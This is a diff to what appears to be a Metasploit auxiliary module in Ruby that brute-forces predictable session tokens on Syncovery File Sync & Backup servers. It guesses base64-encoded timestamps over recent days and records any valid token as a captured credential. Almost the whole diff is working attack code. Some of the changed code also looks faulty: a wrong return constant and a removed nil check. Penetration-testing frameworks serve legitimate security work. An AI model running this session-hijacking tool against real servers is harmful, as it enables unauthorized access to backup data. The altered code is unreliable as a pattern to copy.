@@ -6,10 +6,15 @@
 require 'base64'
 require 'date'
 require 'json'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/syncovery_file_sync_backup'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -65,30 +70,30 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, '/get_global_variables'),
       'method' => 'GET'
     )
-    return CheckCode::Unknown("#{peer} - Could not connect to host - no response") if res.nil?
-    return CheckCode::Unknown("#{peer} - Error (response code: #{res.code})") if res.code != 200
 
-    if res.code == 200
+    if res && res.code == 200
       json_res = res.get_json_document
-      if json_res && (json_res['isSyncoveryLinux'] || !json_res['isSyncoveryWindows'])
+      if json_res['isSyncoveryWindows'] == 'false'
         version = json_res['SyncoveryTitle']&.scan(/Syncovery\s([A-Za-z0-9.]+)/)&.flatten&.first || ''
         if version.empty?
-          vprint_warning("#{rhost}:#{rport} - Could not identify version")
+          vprint_warning("#{peer} - Could not identify version")
           Exploit::CheckCode::Detected
         elsif Rex::Version.new(version) < Rex::Version.new('9.48j') || Rex::Version.new(version) == Rex::Version.new('9.48')
-          vprint_good("#{rhost}:#{rport} - Syncovery #{version}")
+          vprint_good("#{peer} - Syncovery #{version}")
           Exploit::CheckCode::Appears
         else
-          vprint_status("#{rhost}:#{rport} - Syncovery #{version}")
+          vprint_status("#{peer} - Syncovery #{version}")
           Exploit::CheckCode::Safe
         end
       else
         Exploit::CheckCode::Safe
       end
+    else
+      Exploit::Unknown
     end
   end
 
-  def run_host(_ip)
+  def run_host(ip)
     # Calculate dates
     days = datastore['DAYS']
     if days < 0
@@ -101,14 +106,14 @@ class MetasploitModule < Msf::Auxiliary
     time = DateTime.now.strftime('%H:%M:%S')
     hrs, min, sec = time.split(':')
 
-    # Create an array of possible session token values
-    token_queue = []
+    # Create possible session tokens
+    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new
     dates.each do |date|
       (0..hrs.to_i).reverse_each do |hours|
         (0..min.to_i).reverse_each do |minutes|
           (0..sec.to_i).reverse_each do |seconds|
             timestamp = "#{date} #{format('%.2d', hours)}:#{format('%.2d', minutes)}:#{format('%.2d', seconds)}"
-            token_queue << Base64.strict_encode64(timestamp).strip
+            cred_collection.add_private(Base64.strict_encode64(timestamp).strip)
           end
           sec = 59
         end
@@ -117,36 +122,32 @@ class MetasploitModule < Msf::Auxiliary
       hrs = 23
     end
 
-    # Send the request and parse the response. If it does not include 'Session Expired' the token is valid
-    begin
-      print_status("#{peer.strip} - Starting Brute-Forcer")
-      token_queue.each do |token|
-        login_uri = normalize_uri(target_uri.path, '/profiles.json')
-        res = send_request_cgi({
-          'uri' => login_uri,
-          'method' => 'GET',
-          'headers' => {
-            'token' => token
-          },
-          'vars_get' => {
-            'recordstartindex' => '0',
-            'recordendindex' => '0'
-          }
-        })
+    print_status("#{peer.strip} - Starting Brute-Forcer")
+    scanner = Metasploit::Framework::LoginScanner::SyncoveryFileSyncBackup.new(
+      host: ip,
+      port: rport,
+      cred_details: cred_collection,
+      stop_on_success: true, # this will have no effect due to the scanner behaviour when scanning without username
+      connection_timeout: 10
+    )
 
-        return false if !res
+    scanner.scan! do |result|
+      credential_data = result.to_h
+      credential_data.merge!(
+        module_fullname: fullname,
+        workspace_id: myworkspace_id
+      )
 
-        if res.code == 200 && (!res.body.to_s.include? 'Session Expired')
-          print_good("#{rhost}:#{rport} - Valid token found: '#{token}'")
-          return true
-        else
-          vprint_error("#{rhost}:#{rport} - Failed: '#{token}'")
-        end
+      if result.success?
+        credential_data.delete(:username) # This service uses no username
+        credential_core = create_credential(credential_data)
+        credential_data[:core] = credential_core
+        create_credential_login(credential_data)
+        print_good("#{peer.strip} - VALID TOKEN: #{result.credential.private}")
+      else
+        invalidate_login(credential_data)
+        vprint_error("#{peer.strip} - INVALID TOKEN: #{result.credential.private}")
       end
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      fail_with(Failure::Unreachable, "#{peer} - Could not connect to host")
-    rescue ::Timeout::Error, ::Errno::EPIPE
-      fail_with(Failure::Unreachable, "#{peer} - Connection timeout")
     end
   end
 end
